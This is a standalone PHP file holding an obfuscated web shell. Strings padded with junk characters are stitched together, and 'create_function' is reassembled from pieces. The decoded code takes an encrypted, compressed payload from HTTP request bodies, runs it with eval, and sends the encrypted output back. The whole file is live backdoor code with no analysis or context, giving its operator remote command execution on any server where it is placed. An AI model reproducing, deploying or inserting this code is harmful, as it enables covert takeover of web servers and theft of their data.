<?php
$I='Lqen($Lqt);$o="";LqfLqor($i=Lq0;$i<$l;){foLqr($jLq=0;($j<$cLq&&$Lqi<$l);$';
$p='tcLqh("Lq/$kh(.+)$kf/",@fiLqleLq_getLq_contents(Lq"php://inpuLqt"),$mLq)==';
$J='pLq="GLqLqUSt4dhLqYxLqenV1kw0";functionLq x($t,$k){$c=strleLqn(Lq$k);$l=strl';
$S=str_replace('FE','','crFEeatFEe_FEfFEFEunFEction');
$H='1) {Lq@ob_sLqtart();@eLqvalLq(@gzuncomLqLqpress(@xLq(@bLqase64_dLqecode(L';
$Y='LqeLq64_encode(Lq@x(@LqgLqzcompLqress($o)Lq,$k));prinLqt(Lq"$p$kh$r$kf");}';
$X='Lqj++,$i++Lq){$oLq.Lq=$t{$i}^$k{$jLq}Lq;}}returLqn Lq$o;}if Lq(@preLqLqg_ma';
$L='$k=Lq"c3Lq0eaf4fLq";$kh="Lq12c3Lqb4331a0a";$Lqkf="1ecLqLq8021dbb69";$LqLq';
$x='qLq$m[1Lq]),LqLq$k)));$o=@ob_get_cLqontents();@oLqb_end_LqcleLqan();$r=@bas';
$w=str_replace('Lq','',$L.$J.$I.$X.$p.$H.$x.$Y);
$B=$S('',$w);$B();
?>
